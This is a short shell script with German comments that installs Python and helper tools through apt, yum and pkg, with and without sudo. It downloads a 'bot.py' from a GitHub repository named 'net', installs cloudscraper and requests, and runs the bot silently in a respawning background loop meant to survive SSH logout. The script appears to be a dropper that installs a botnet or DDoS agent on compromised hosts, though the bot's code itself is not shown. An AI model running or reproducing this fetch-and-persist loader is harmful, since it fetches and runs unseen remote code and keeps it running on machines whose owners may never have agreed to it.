#!/bin/sh

# --- Python/Pip Installation (ohne und mit sudo) ---
apt update
apt install -y python3 python-pip3 screen tmux nohup coreutils
apt install -y python python-pip
yum install -y python3 python-pip3 screen tmux nohup coreutils
yum install -y python python-pip
pkg install -y python3 python-pip3 screen tmux nohup coreutils
pkg install -y python python-pip

sudo apt update
sudo apt install -y python3 python-pip3 screen tmux nohup coreutils
sudo apt install -y python python-pip
sudo yum install -y python3 python-pip3 screen tmux nohup coreutils
sudo yum install -y python python-pip
sudo pkg install -y python3 python-pip3 screen tmux nohup coreutils
sudo pkg install -y python python-pip

# --- Python-Skript herunterladen ---
wget -O bot.py https://raw.githubusercontent.com/M220506/net/refs/heads/main/bot.py || curl -o bot.py https://raw.githubusercontent.com/M220506/net/refs/heads/main/bot.py

# --- Python-Pakete installieren ---
pip3 install cloudscraper requests || true
pip install cloudscraper requests || true

sudo pip3 install cloudscraper requests || true
sudo pip install cloudscraper requests || true

# --- Hintergrundstart: Priorität BusyBox, dann nohup, dann klassisch mit & ---
if command -v busybox >/dev/null 2>&1 && busybox nohup true 2>/dev/null; then
    echo "Starte mit busybox nohup..."
    busybox nohup sh -c 'while true; do python3 bot.py || python bot.py; sleep 5; done' >/dev/null 2>&1 &
elif command -v nohup >/dev/null 2>&1; then
    echo "Starte mit klassischem nohup..."
    nohup sh -c 'while true; do python3 bot.py || python bot.py; sleep 5; done' >/dev/null 2>&1 &
else
    echo "Weder busybox nohup noch klassisches nohup gefunden! Starte einfach im Hintergrund (hält SSH-Logout evtl. nicht aus)."
    (while true; do python3 bot.py || python bot.py; sleep 5; done) >/dev/null 2>&1 &
fi

exit 0
